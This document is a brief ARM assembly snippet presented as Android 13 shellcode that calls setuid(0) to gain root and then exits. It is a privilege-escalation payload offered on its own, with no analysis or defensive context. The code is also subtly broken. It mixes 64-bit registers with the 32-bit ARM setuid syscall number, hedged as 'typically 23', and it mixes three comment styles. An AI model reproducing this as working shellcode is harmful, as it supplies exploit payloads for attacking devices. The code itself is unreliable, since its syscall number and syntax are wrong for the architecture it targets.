; Android 13 ARM setuid(0) Shellcode
.section .text
.global _start
_start:
    mov x0, #0         @ Desired UID: 0
    mov x8, #23        @ sys_setuid on ARM Linux is typically 23
    svc 0
    /* Exit gracefully */
    mov x0, #0
    mov x8, #93        @ sys_exit
    svc 0